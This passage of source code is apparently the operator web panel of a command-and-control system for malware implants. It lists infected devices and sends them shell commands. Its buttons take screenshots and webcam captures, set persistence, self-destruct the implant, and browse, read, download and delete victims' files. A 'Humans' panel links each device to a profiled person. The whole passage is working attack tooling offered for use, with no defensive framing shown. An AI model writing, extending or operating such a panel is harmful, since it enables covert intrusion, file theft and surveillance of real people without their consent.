.fm-t td{padding:3px 6px;border-bottom:1px solid #0f1620}
.fm-t tr{cursor:default}
.fm-t tr:hover td{background:var(--surface2)}
.fm-t .fn{cursor:pointer}
.fm-t .fn:hover{color:var(--green)}
.fm-t .act{display:flex;gap:3px;opacity:0.3}
.fm-t tr:hover .act{opacity:1}
.fm-nf{padding:20px;text-align:center;color:var(--text2);font-size:11px}
.fm-ld{padding:20px;text-align:center;color:var(--text2)}
.fm-ld .sp{display:inline-block;width:14px;height:14px;border:2px solid var(--border);border-top-color:var(--green);border-radius:50%;animation:sp .6s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.fm-cb{min-height:100px}
.fm-prop{font-size:11px;line-height:1.8}
.fm-prop .fp-l{color:var(--text2);display:inline-block;width:80px}
.fm-read{font-family:monospace;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:60vh;overflow-y:auto;background:#000;padding:8px;border-radius:4px;color:var(--text);line-height:1.4}
.btn{padding:4px 12px;border:none;border-radius:4px;font-size:11px;font-weight:600;cursor:pointer;transition:.1s;white-space:nowrap}
.btn-g{background:var(--green);color:#000}
.btn-g:hover{background:#00e060}
.btn-b{background:var(--blue);color:#fff}
.btn-b:hover{background:#4090ff}
.btn-r{background:var(--red);color:#fff}
.btn-r:hover{background:#ff3055}
.btn-gh{background:var(--surface2);color:var(--text2);border:1px solid var(--border)}
.btn-gh:hover{background:var(--border);color:var(--text)}
.btn-xs{padding:2px 7px;font-size:9px}
.qb{display:flex;gap:3px;flex-wrap:wrap;margin-top:5px}
.qb .btn{font-size:9px;padding:2px 7px}
.mg{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:6px}
.mi{background:var(--surface2);border:1px solid var(--border);border-radius:5px;overflow:hidden;cursor:pointer;transition:.1s}
.mi:hover{border-color:var(--green)}
.mi img{width:100%;height:70px;object-fit:cover;display:block}
.mi .mi2{padding:4px 6px;font-size:9px;color:var(--text2)}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000000cc;z-index:999;align-items:center;justify-content:center}
.modal.on{display:flex}
.modal-c{background:var(--surface);border:1px solid var(--border);border-radius:10px;max-width:95vw;max-height:95vh;overflow:auto;padding:10px}
.modal-c img{max-width:100%;max-height:85vh;display:block;border-radius:4px}
.toast{position:fixed;bottom:20px;right:20px;background:var(--surface2);color:var(--text);padding:9px 16px;border-radius:6px;font-size:12px;z-index:1000;border:1px solid var(--border);display:none;max-width:340px;box-shadow:0 4px 20px #000}
.toast.g{border-color:var(--green)}.toast.r{border-color:var(--red)}
input,select{background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:5px 8px;color:var(--text);font-size:12px;outline:none;width:100%}
input:focus{border-color:var(--green)}
.nick-input{background:transparent;border:none;border-bottom:1px dashed var(--green);color:var(--green);font-size:12px;font-weight:600;padding:0 4px;width:auto;min-width:60px;outline:none}
.nick-input:focus{border-bottom:1px solid var(--green)}
/* ── Persons / CTOS ── */
.pr-rw{display:flex;gap:8px;align-items:flex-start}
.pr-av{width:80px;height:80px;border-radius:50%;object-fit:cover;border:2px solid var(--border);flex-shrink:0;background:var(--surface2);cursor:pointer}
.pr-av:hover{border-color:var(--green)}
.pr-av-sm{width:32px;height:32px;border-radius:50%;object-fit:cover;border:1px solid var(--border);flex-shrink:0;background:var(--surface2)}
.pr-info{flex:1;min-width:0}
.pr-info .pn{font-size:15px;font-weight:700}
.pr-info .ps{font-size:10px;color:var(--text2);margin-top:2px}
.pr-info .pd{font-size:11px;color:var(--text);margin-top:4px;white-space:pre-wrap;word-break:break-word}
.pr-dev{display:flex;flex-wrap:wrap;gap:4px;margin-top:6px}
.pr-dev .pr-dt{font-size:9px;padding:1px 6px;border-radius:3px;background:var(--surface2);border:1px solid var(--border);color:var(--cyan);cursor:pointer}
.pr-dev .pr-dt:hover{border-color:var(--green)}
.pr-dev .pr-dt .pr-dx{color:var(--red);margin-left:3px;cursor:pointer;font-weight:700}
.pr-form label{display:block;font-size:10px;color:var(--text2);margin:6px 0 2px}
.pr-form input,.pr-form textarea,.pr-form select{width:100%;margin-bottom:2px}
.pr-form textarea{min-height:60px;resize:vertical}
.pr-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:6px;padding:4px}
.pr-card{background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:8px;cursor:pointer;transition:.1s;display:flex;gap:8px;align-items:center}
.pr-card:hover{border-color:var(--green);background:var(--surface)}
.pr-card .pr-ci{flex:1;min-width:0}
.pr-card .pr-ci .pr-cn{font-size:11px;font-weight:600}
.pr-card .pr-ci .pr-cs{font-size:9px;color:var(--text2)}
/* ── Humans toggle ── */
#psb{width:200px;border-left:1px solid var(--border);overflow:hidden;transition:width .2s,margin .2s,padding .2s}
#psb.off{width:0;margin:0;padding:0;border-left:none}
#psb.off .sh{display:none}
#psb.off .items{display:none}
.btn-hm{background:var(--surface2);color:var(--text2);border:1px solid var(--border)}
.btn-hm.on{background:var(--green);color:#000;border-color:var(--green)}
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
a{color:var(--blue);text-decoration:none}
</style>
</head>
<body>

<div class="top">
<h1>&#9670; C2 <span>Panel</span></h1>
<div class="st">
    <span><b class="g">&#9679;</b> <span id="s-act"><?=$active?></span> act</span>
    <span><b class="r">&#9679;</b> <span id="s-dead"><?=$total-$active?></span> dead</span>
    <span><span id="s-tot"><?=$total?></span> tot</span>
    <span style="color:var(--amber)"><span id="s-pend"><?=$pending?></span> pend</span>
    <span style="color:var(--cyan)"><span id="s-done"><?=$done?></span> done</span>
    <span><button id="hm-tg" class="btn btn-xs btn-hm" onclick="toggleHumans()">&#128100; Humans</button></span>
    <span><a href="?action=logout" class="btn btn-xs btn-gh" style="text-decoration:none">&#128682; Logout</a></span>
</div>
</div>

<div class="hf">
<div class="sb">
    <div class="sh">
        Devices <span style="font-weight:400;color:var(--text2)" id="bcnt">(<?=$total?>)</span>
        <input id="bf" placeholder="search name, ip, uuid..." oninput="filterB()">
    </div>
    <div class="items" id="blist"></div>
</div>

<div class="sb off" id="psb">
    <div class="sh">
        HUMANS <span style="font-weight:400;color:var(--text2)" id="pcnt">(0)</span>
        <span style="display:flex;gap:3px;margin-top:3px">
            <button class="btn btn-xs btn-gh" onclick="personForm()" style="flex:1">+ Add</button>
            <button class="btn btn-xs btn-gh" onclick="loadPersons()">&#8635;</button>
        </span>
    </div>
    <div class="items" id="plist"></div>
</div>

<div class="rt">
    <div class="wc" id="wc">
        <div class="bg">&#9670;</div>
        Select a device
    </div>

    <div class="pn" id="bp">
        <div class="rw">
            <div class="cl">
                <div class="cd"><div class="ch">&#9679; Device Info</div>
                <div class="cb"><div class="ig" id="binfo"></div></div></div>
            </div>
            <div class="cl">
                <div class="cd"><div class="ch">&#9889; Quick Actions</div>
                <div class="cb">
                    <div class="qb">
                        <button class="btn btn-xs btn-gh" onclick="qc('pwd')">pwd</button>
                        <button class="btn btn-xs btn-b" onclick="qc('screenshot')">&#128247; screenshot</button>
                        <button class="btn btn-xs btn-b" onclick="qc('cam')">&#128248; cam</button>
                        <button class="btn btn-xs btn-gh" onclick="qc('persist')">persist</button>
                        <button class="btn btn-xs btn-r" onclick="if(confirm('Destroy?'))qc('selfdestruct')">&#128128; kill</button>
                        <button class="btn btn-xs btn-b" onclick="fmToggle()">&#128193; FM</button>
                        <button class="btn btn-xs btn-gh" onclick="dfToggle()">&#128451; DF</button>
                    </div>
                </div></div>
            </div>
        </div>

        <div class="cd"><div class="ch">&#128221; Notes</div>
        <div class="cb">
            <textarea class="nt" id="nt-in" placeholder="Notes about this device..."></textarea>
            <div class="nt-ct">
                <button class="btn btn-xs btn-g" onclick="saveNotes()">Save</button>
                <span id="nt-st" style="font-size:10px;color:var(--text2);margin-left:4px"></span>
            </div>
        </div></div>

        <div class="cd" id="fm-card">
            <div class="ch">&#128193; Beacon File Browser <span id="fm-nm" style="font-weight:400;color:var(--text2)"></span> <button class="btn btn-xs btn-gh" onclick="fmToggle()" style="margin-left:auto">&#10005;</button></div>
            <div class="cb fm-cb">
                <div class="fm-pb" id="fm-pb"><button class="btn btn-xs btn-g" onclick="fmGo()">&#10148;</button></div>
                <div id="fm-body"><div class="fm-nf">Click &#128193; FM in Quick Actions to open.</div></div>
            </div>
        </div>
        <div class="cd" id="df-card">
            <div class="ch">&#128451; Device Files <span id="df-nm" style="font-weight:400;color:var(--text2)"></span> <button class="btn btn-xs btn-gh" onclick="dfToggle()" style="margin-left:auto">&#10005;</button></div>
            <div class="cb fm-cb">
                <div id="df-body"><div class="fm-nf">Click &#128451; DF in Quick Actions to open.</div></div>
            </div>
        </div>
        <div class="rw" style="margin-top:12px">
            <div class="cl">
                <div class="cd"><div class="ch">&#128230; Uploaded Files</div>
                <div class="cb" id="bfs"><div style="color:var(--text2);font-size:11px">No files.</div></div></div>
            </div>
            <div class="cl">
                <div class="cd"><div class="ch">&#128247; Media <span id="mcn" style="font-weight:400;color:var(--text2)"></span></div>
                <div class="cb" id="bme"></div></div>
            </div>
        </div>
    </div>
    </div>

    <div class="tc" id="tc">
        <div class="th">&#9001; Terminal <span class="th-n" id="th-n">-</span></div>
        <div class="to" id="tout"><div class="l s">Select a device.</div></div>
        <div class="ti">
            <input id="tin" placeholder="shell whoami, browse, screenshot..." onkeydown="if(event.key==='Enter')dc()">
            <button class="btn btn-g" onclick="dc()">&#10148;</button>
        </div>
    </div>
</div>

<div class="modal" id="mim" onclick="this.classList.remove('on')"><div class="modal-c"><img id="mim-s"></div></div>
<div class="modal" id="pm"><div class="modal-c" style="max-width:500px;width:90vw;padding:0" id="pm-c"></div></div>
<div class="toast" id="toast"></div>

<script>
let SEL='';const TRMS={};let TID=0, LAST_SEEN={};
function es(s){return(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
function tm(m,e){const t=document.getElementById('toast');t.textContent=m;t.className='toast'+(e?' r':' g');t.style.display='block';setTimeout(()=>t.style.display='none',3000)}
async function ap(u,o){try{const r=await fetch(u,o);return((r.headers.get('content-type')||'').includes('json'))?await r.json():r}catch(e){tm('Net: '+e.message,1);return null}}

// ── Humans panel toggle ──
function toggleHumans(){
    const sb=document.getElementById('psb');
    const tg=document.getElementById('hm-tg');
    const on=sb.classList.toggle('off');
    tg.classList.toggle('on',!on);
    localStorage.setItem('hm_tg',on?'0':'1');
    if(!on)loadPersons();
}
// Restore toggle state on load
(function(){
    const v=localStorage.getItem('hm_tg');
    if(v==='1'){document.getElementById('psb').classList.remove('off');document.getElementById('hm-tg').classList.add('on');}
})();

function rT(u){
    const el=document.getElementById('tout');if(!el)return;
    if(!TRMS[u])TRMS[u]=[];
    el.innerHTML=TRMS[u].map(l=>`<div class="l ${l.t}">${es(l.v)}</div>`).join('');
    el.scrollTop=el.scrollHeight;
}
function tA(u,t,v){
    if(!TRMS[u])TRMS[u]=[];
    TRMS[u].push({t,v});
    if(TRMS[u].length>300)TRMS[u].splice(0,100);
    if(u===SEL)rT(u);
}

// ── Build beacon list with live/dead sections ──
function SECS_AGO(d){if(!d)return 999;const n=new Date(),p=new Date(d.replace(' ','T')+'Z');return isNaN(p.getTime())?999:(n-p)/1000}

function buildList(beacons){
    const el=document.getElementById('blist');
    const now=Date.now();
    // Mark dead beacons (no check-in for 60s+)
    beacons.forEach(b=>{
        const secs=SECS_AGO(b.last_seen);
        if(b.status==='active'&&secs>60){
            b.status='dead';
        }
    });
    const live=beacons.filter(b=>b.status==='active');
    const dead=beacons.filter(b=>b.status!=='active');
    const q=(document.getElementById('bf').value||'').toLowerCase();
    let html='';
    if(live.length){
        html+=`<div class="grp"><div class="gl">&#9679; Active <span class="ct">${live.length}</span></div></div>`;
        live.forEach(b=>{
            if(q&&!b.hostname.toLowerCase().includes(q)&&!(b.uuid||'').includes(q)&&!(b.ip||'').includes(q)&&!(b.nickname||'').toLowerCase().includes(q))return;
            html+=bitem(b,'g');
        });
    }
    if(dead.length){
        html+=`<div class="grp"><div class="gl">&#9719; Inactive <span class="ct">${dead.length}</span></div></div>`;
        dead.forEach(b=>{
            if(q&&!b.hostname.toLowerCase().includes(q)&&!(b.uuid||'').includes(q)&&!(b.ip||'').includes(q)&&!(b.nickname||'').toLowerCase().includes(q))return;
            html+=bitem(b,'r');
        });
    }
    if(!html)html='<div style="padding:30px;text-align:center;color:var(--text2);font-size:11px">Nothing found</div>';
    el.innerHTML=html;
    document.getElementById('bcnt').textContent='('+beacons.length+')';
    // Re-select current
    if(SEL)document.querySelector(`.bit[data-u="${SEL}"]`)?.classList.add('sel');
}

function bitem(b,c){
    const nm=b.nickname||b.hostname||'unknown';
    const sub=b.username+' @ '+b.ip;
    const nk=b.nickname?`<span class="nick">${es(b.nickname)}</span> <span class="un">(${es(b.hostname||'')})</span>`:es(b.hostname||'unknown');
    const ls=b.last_seen?b.last_seen.substring(5,16):'';
    return `<div class="bit" data-u="${es(b.uuid)}" onclick="selB(this.dataset.u)">
        <span class="dd" style="background:${c==='g'?'var(--green)':'var(--red)'}"></span>
        <div class="bi"><div class="nm">${nk}</div>
        <div class="sb2">${es(sub)}</div></div>
        <span class="ts">${ls}</span>
    </div>`;
}

async function selB(uuid){
    SEL=uuid;
    document.querySelectorAll('.bit').forEach(el=>el.classList.remove('sel'));
    const item=document.querySelector(`.bit[data-u="${uuid}"]`);
    if(item)item.classList.add('sel');
    document.getElementById('wc').style.display='none';
    document.getElementById('bp').classList.add('on');
    document.getElementById('tc').classList.add('on');
    const b=await ap('?action=beacons');
    const be=b?b.find(x=>x.uuid===uuid):null;
    const nm=be?es(be.nickname||be.hostname||''):'';
    document.getElementById('th-n').textContent=nm||uuid.substring(0,8);
    // Load terminal history from server
    const th=await ap('?action=terminal&beacon_uuid='+uuid);
    if(th&&th.length){
        TRMS[uuid]=th.map(e=>({v:e.command+'\n'+(e.output||''),t:'w'}));
        rT(uuid);
    }else{
        if(TRMS[uuid]&&TRMS[uuid].length)rT(uuid);
        else{tA(uuid,'s','Terminal for '+(nm||uuid));rT(uuid);}
    }
    await loadInfo(uuid);
    await loadBF(uuid);
    await loadBM(uuid);
    document.getElementById('nt-in').value=be&&be.notes?be.notes:'';
    loadPersons();
}

function filterB(){ap('?action=beacons').then(d=>{if(d)buildList(d)})}

// ── Info ──
async function loadInfo(uuid){
    const b=await ap('?action=beacons');
    if(!b)return;
    const be=b.find(x=>x.uuid===uuid);
    if(!be){document.getElementById('binfo').innerHTML='<span style="color:var(--text2)">Not found</span>';return;}
    const st=be.status||'dead';
    const secs=SECS_AGO(be.last_seen);
    const ago=secs<120?Math.round(secs)+'s ago':secs<3600?Math.round(secs/60)+'m ago':Math.round(secs/3600)+'h ago';
    const nick=be.nickname||'';
    const dc=be.disconnected_at?be.disconnected_at:'--';
    // Also fetch persisted info from info.json
    const pi=await ap('?action=device_info&beacon_uuid='+uuid);

    const host=pi&&pi.hostname?pi.hostname:(be.hostname||'-');
    const os=pi&&pi.os?pi.os:(be.os||'-');
    const user=pi&&pi.username?pi.username:(be.username||'-');
    const ip=pi&&pi.ip?pi.ip:(be.ip||'-');
    const priv=pi&&pi.privilege?pi.privilege:(be.privilege||'user');

    document.getElementById('binfo').innerHTML=
        `<span class="l">Nickname</span><span><input class="nick-input" id="nick-in" value="${es(nick)}" placeholder="set nickname" onchange="renameB('${es(uuid)}',this.value)" style="width:${Math.max(60,(nick.length||6)*8)}px"></span>`+
        `<span class="l">UUID</span><span class="tt">${es(be.uuid)}</span>`+
        `<span class="l">Hostname</span><span><b>${es(host)}</b></span>`+
        `<span class="l">OS</span><span>${es(os)}</span>`+
        `<span class="l">User</span><span>${es(user)}</span>`+
        `<span class="l">IP</span><span>${es(ip)}</span>`+
        `<span class="l">Privilege</span><span><span class="tg ${priv==='root'||priv==='admin'?'tg-r':'tg-b'}">${es(priv)}</span></span>`+
        `<span class="l">PID</span><span>${be.pid||'-'}</span>`+
        `<span class="l">Status</span><span><span class="tg ${st==='active'?'tg-g':'tg-r'}">${st}</span></span>`+
        `<span class="l">Last Seen</span><span>${es(be.last_seen||'-')} (${ago})</span>`+
        `<span class="l">Disconnected</span><span>${dc}</span>`+
        `<span class="l">First Seen</span><span>${es(be.first_seen||'-')}</span>`+
        (pi&&pi.collected_at?`<span class="l">Info Saved</span><span>${es(pi.collected_at)}</span>`:'')+
        `<span class="l">CTOS</span><span id="ctos-link-${es(uuid)}">${es('<loading...>')}</span>`+
        `<span class="l"></span><span><button class="btn btn-xs btn-r" onclick="removeDevice('${es(uuid)}')">&#128465; Remove Device</button></span>`;
    // Load persons and show link
    const ps=await ap('?action=persons');
    const per=getPersonForDevice(uuid,ps);
    const el=document.getElementById('ctos-link-'+uuid);
    if(per){
        el.innerHTML=`<span class="tg tg-b" style="cursor:pointer" onclick="openPerson('${per.id}')">&#128100; ${es(per.name)}</span> <span class="btn btn-xs btn-gh" onclick="unlinkDevicePerson('${per.id}','${uuid}')" style="font-size:8px">x</span>`;
    }else{
        const opts=ps&&ps.length?ps.map(p=>`<option value="${p.id}">${es(p.name)}</option>`).join(''):'<option value="">No persons</option>';
        el.innerHTML=`<span style="font-size:10px;color:var(--text2)">None</span> <select id="ctos-ls-${es(uuid)}" style="width:auto;display:inline;font-size:9px;padding:1px 4px" onchange="linkDevicePerson(this,'${es(uuid)}')"><option value="">Link...</option>${opts}</select>`;
    }
}

async function renameB(uuid,nick){
    await ap('?action=rename',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uuid,nickname:nick})});
    document.getElementById('th-n').textContent=es(nick||uuid.substring(0,8));
    const b=await ap('?action=beacons');
    if(b)buildList(b);
}

async function removeDevice(uuid){
    if(!confirm(`Permanently remove device ${uuid.substring(0,8)}...? This will delete all data.`))return;
    const r=await ap('?action=remove_device',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uuid})});
    if(r&&r.status==='ok'){
        if(SEL===uuid){SEL='';document.getElementById('bp').classList.remove('on');document.getElementById('wc').classList.add('on');}
        const b=await ap('?action=beacons');
        if(b)buildList(b);
        tm('Device removed');
    }else{
        tm('Failed to remove device',1);
    }
}

async function saveNotes(){
    const text=document.getElementById('nt-in').value;
    if(!SEL)return;
    await ap('?action=savenotes',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uuid:SEL,text})});
    document.getElementById('nt-st').textContent='Saved at '+new Date().toLocaleTimeString();
    setTimeout(()=>document.getElementById('nt-st').textContent='',2000);
    if(document.getElementById('df-card').classList.contains('df-on')) loadDeviceFiles(SEL);
}

// ── File Manager ──
let FM_PATH = '/';

function fmToggle(){
    const card = document.getElementById('fm-card');
    card.classList.toggle('fm-on');
    if(!card.classList.contains('fm-on')) return;
    if(!SEL){ tm('Select a device first',1); card.classList.remove('fm-on'); return; }
    // Init path bar on first open
    if(!document.getElementById('fm-in')){
        document.getElementById('fm-pb').innerHTML = fmPB('/') +
            ' <input id="fm-in" value="/" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>';
        document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Enter a path and press Enter, or click Go.</div>';
    }
}

function fmPB(path){
    const segs = path.split('/').filter(Boolean);
    // Always start with /
    let html = '<span class="pth pth-cur" onclick="fmNav(\'/\')">/</span>';
    let cur = '';
    for(const s of segs){
        cur += '/' + s;
        const cls = cur === path ? 'pth pth-cur' : 'pth';
        html += '<span class="'+cls+'" onclick="fmNav(\''+es(cur)+'\')">'+es(s)+'</span>';
        html += '<span style="color:var(--text2)">/</span>';
    }
    return html;
}

async function fmInit(uuid){
    FM_PATH = '/';
    document.getElementById('fm-nm').textContent = '';
    // Check cache for /
    const cached = await ap('?action=browse_cache&beacon_uuid='+uuid+'&path='+encodeURIComponent('/'));
    if(cached && cached.entries){
        FM_PATH = '/';
        fmRender(cached.entries, '/');
        document.getElementById('fm-pb').innerHTML = fmPB('/') +
            ' <input id="fm-in" value="/" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>';
    }else{
        // Send browse /
        document.getElementById('fm-body').innerHTML = '<div class="fm-ld"><div class="sp"></div> Browsing...</div>';
        document.getElementById('fm-pb').innerHTML = fmPB('/') +
            ' <input id="fm-in" value="/" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>';
        fmSendBrowse(uuid, '/');
    }
}

function fmGo(){
    const inp = document.getElementById('fm-in');
    if(!inp || !inp.value.trim()) return;
    const p = inp.value.trim();
    FM_PATH = p;
    fmNav(p);
}

async function fmNav(path){
    if(!SEL) return;
    FM_PATH = path;
    document.getElementById('fm-nm').textContent = path;
    document.getElementById('fm-pb').innerHTML = fmPB(path) +
        ' <input id="fm-in" value="'+es(path)+'" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
        ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>';
    const cached = await ap('?action=browse_cache&beacon_uuid='+SEL+'&path='+encodeURIComponent(path));
    if(cached && cached.entries){
        fmRender(cached.entries, path);
    }else{
        document.getElementById('fm-body').innerHTML = '<div class="fm-ld"><div class="sp"></div> Browsing...</div>';
        fmSendBrowse(SEL, path);
    }
}

function fmRefresh(){
    if(!SEL || !FM_PATH) return;
    document.getElementById('fm-body').innerHTML = '<div class="fm-ld"><div class="sp"></div> Refreshing...</div>';
    fmSendBrowse(SEL, FM_PATH);
}

async function fmSendBrowse(uuid, path){
    const r = await ap('?action=browse_req', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({beacon_uuid:uuid, path})});
    if(r && r.task_id){
        fmPollBrowse(uuid, path, r.task_id, 0);
    }else{
        document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Failed to send browse command.</div>';
    }
}

function fmPollBrowse(uuid, path, tid, count){
    if(count > 30){ document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Timed out.</div>'; return; }
    setTimeout(async ()=>{
        const res = await ap('?action=results&task_id='+tid);
        if(res && res.length){
            const out = res[0].output || '';
            // Try to parse as JSON
            try{
                const j = JSON.parse(out);
                if(j.files){
                    // Directory listing
                    // Store in cache
                    await ap('?action=browse_cache', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({beacon_uuid:uuid, path, entries: j.files})});
                    if(uuid === SEL && path === FM_PATH){
                        fmRender(j.files, path);
                    }
                }else if(j.type === 'file'){
                    // It's a single file - go to parent
                    const parent = path.split('/').slice(0,-1).join('/') || '/';
                    fmNav(parent);
                }else if(j.error){
                    document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Error: '+es(j.error)+'</div>';
                }
            }catch(e){
                // Not JSON - show raw
                document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Unexpected response. Try a different path.</div>';
            }
        }else{
            fmPollBrowse(uuid, path, tid, count+1);
        }
    }, count === 0 ? 6000 : 5000);
}

function fmRender(entries, path){
    const el = document.getElementById('fm-body');
    if(!entries || !entries.length){
        el.innerHTML = '<div class="fm-nf">Empty directory.</div>';
        return;
    }
    const isRoot = path === '/';
    let html = '<table class="fm-t"><thead><tr><th>Name</th><th>Size</th><th>Type</th><th>Modified</th><th></th></tr></thead><tbody>';
    if(!isRoot){
        const parent = path.split('/').slice(0,-1).join('/') || '/';
        html += '<tr><td class="fn" onclick="fmNav(\''+es(parent)+'\')"><span style="color:var(--amber)">&#8617; ..</span></td><td></td><td></td><td></td><td></td></tr>';
    }
    // Dirs first, sorted
    const dirs = entries.filter(e => e.type === 'dir').sort((a,b) => a.name.localeCompare(b.name));
    const files = entries.filter(e => e.type !== 'dir').sort((a,b) => a.name.localeCompare(b.name));
    for(const e of [...dirs, ...files]){
        const fullPath = (path==='/'?'':path) + '/' + e.name;
        const sz = e.type === 'dir' ? '--' : (e.size > 1048576 ? (e.size/1048576).toFixed(1)+'M' : e.size > 1024 ? (e.size/1024).toFixed(1)+'K' : e.size+'B');
        const mod = e.modified ? e.modified.substring(0,16).replace('T',' ') : '--';
        const icon = e.type === 'dir' ? '&#128193;' : '&#128196;';
        html += '<tr>';
        if(e.type === 'dir'){
            html += '<td class="fn" onclick="fmNav(\''+es(fullPath)+'\')">'+icon+' '+es(e.name)+'</td>';
        }else{
            html += '<td class="fn" onclick="fmReadFile(\''+es(fullPath)+'\')">'+icon+' '+es(e.name)+'</td>';
        }
        html += '<td>'+sz+'</td>';
        html += '<td>'+es(e.type)+'</td>';
        html += '<td style="font-size:10px;color:var(--text2)">'+mod+'</td>';
        html += '<td class="act">';
        if(e.type === 'file'){
            html += '<button class="btn btn-xs btn-g" onclick="event.stopPropagation();fmReadFile(\''+es(fullPath)+'\')">Read</button>';
            html += '<button class="btn btn-xs btn-b" onclick="event.stopPropagation();fmDownload(\''+es(fullPath)+'\',\''+es(e.name)+'\')">DL</button>';
        }
        html += '<button class="btn btn-xs btn-gh" onclick="event.stopPropagation();fmProp(\''+es(fullPath)+'\',\''+es(e.type)+'\','+(e.size||0)+',\''+es(e.perms||'')+'\',\''+es(e.modified||'')+'\')">Info</button>';
        html += '<button class="btn btn-xs btn-r" onclick="event.stopPropagation();if(confirm(\'Delete '+es(e.name)+'?\'))fmDelete(\''+es(fullPath)+'\')">Del</button>';
        html += '</td></tr>';
    }
    html += '</tbody></table>';
    el.innerHTML = html;
}

async function fmReadFile(path){
    if(!SEL) return;
    tA(SEL,'g','$ read '+path);
    tA(SEL,'s','Reading file...');
    const r = await ap('?action=task', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({beacon_uuid:SEL, command:'read '+path})});
    if(r && r.status === 'created'){
        fmPollRead(SEL, r.id, 0, path);
    }else{
        tA(SEL,'r','Failed to send read command');
    }
}

function fmPollRead(uuid, tid, count, path){
    if(count > 30){ tA(uuid,'r','Read timed out'); return; }
    setTimeout(async ()=>{
        const res = await ap('?action=results&task_id='+tid);
        if(res && res.length){
            const out = res[0].output || '(empty)';
            if(TRMS[uuid] && TRMS[uuid].length && TRMS[uuid][TRMS[uuid].length-1].t === 's') TRMS[uuid].pop();
            tA(uuid,'w', out);
            showReadModal(out, path);
        }else{
            fmPollRead(uuid, tid, count+1, path);
        }
    }, count === 0 ? 6000 : 5000);
}

function showReadModal(content, path){
    // Close existing fm-read modal
    let m = document.getElementById('fm-read-m');
    if(!m){
        m = document.createElement('div');
        m.id = 'fm-read-m';
        m.className = 'modal';
        m.innerHTML = '<div class="modal-c" style="max-width:80vw"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><b style="font-size:12px" id="fm-read-title">File</b><button class="btn btn-xs btn-gh" onclick="document.getElementById(\'fm-read-m\').classList.remove(\'on\')">Close</button></div><pre class="fm-read" id="fm-read-c"></pre></div>';
        document.body.appendChild(m);
    }
    document.getElementById('fm-read-title').textContent = path;
    document.getElementById('fm-read-c').textContent = content;
    m.classList.add('on');
    m.onclick = function(e){if(e.target === m) m.classList.remove('on');};
}

async function fmDelete(path){
    if(!SEL) return;
    tA(SEL,'g','$ rm '+path);
    tA(SEL,'s','Deleting...');
    const r = await ap('?action=file_delete', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({beacon_uuid:SEL, path})});
    if(r && r.status === 'created'){
        fmPollAction(SEL, r.task_id, 0, path, 'deleted');
    }else{
        tA(SEL,'r','Failed to send delete command');
    }
}

async function fmDownload(path, name){
    if(!SEL) return;
    tA(SEL,'g','$ upload '+path);
    tA(SEL,'s','Downloading from beacon...');
    const r = await ap('?action=task', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({beacon_uuid:SEL, command:'upload '+path})});
    if(r && r.status === 'created'){
        fmPollAction(SEL, r.task_id, 0, path, 'downloaded');
    }else{
        tA(SEL,'r','Failed to send upload command');
    }
}

function fmPollAction(uuid, tid, count, path, label){
    if(count > 30){ tA(uuid,'r','Action timed out'); return; }
    setTimeout(async ()=>{
        const res = await ap('?action=results&task_id='+tid);
        if(res && res.length){
            const out = res[0].output || '(done)';
            if(TRMS[uuid] && TRMS[uuid].length && TRMS[uuid][TRMS[uuid].length-1].t === 's') TRMS[uuid].pop();
            tA(uuid,'w', out);
            tm(path+' '+label, 0);
            if(uuid === SEL){ await loadBF(SEL); fmRefresh(); }
        }else{
            fmPollAction(uuid, tid, count+1, path, label);
        }
    }, count === 0 ? 6000 : 5000);
}

function fmProp(path, type, size, perms, modified){
    let m = document.getElementById('fm-prop-m');
    if(!m){
        m = document.createElement('div');
        m.id = 'fm-prop-m';
        m.className = 'modal';
        m.innerHTML = '<div class="modal-c" style="max-width:400px"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><b style="font-size:12px">Properties</b><button class="btn btn-xs btn-gh" onclick="document.getElementById(\'fm-prop-m\').classList.remove(\'on\')">Close</button></div><div class="fm-prop" id="fm-prop-c"></div></div>';
        document.body.appendChild(m);
    }
    const szStr = size > 1048576 ? (size/1048576).toFixed(2)+' MB' : size > 1024 ? (size/1024).toFixed(2)+' KB' : size+' B';
    document.getElementById('fm-prop-c').innerHTML =
        '<span class="fp-l">Name:</span>'+es(path.split('/').pop())+'<br>'+
        '<span class="fp-l">Path:</span>'+es(path)+'<br>'+
        '<span class="fp-l">Type:</span>'+es(type)+'<br>'+
        '<span class="fp-l">Size:</span>'+szStr+'<br>'+
        '<span class="fp-l">Perms:</span>'+es(perms||'--')+'<br>'+
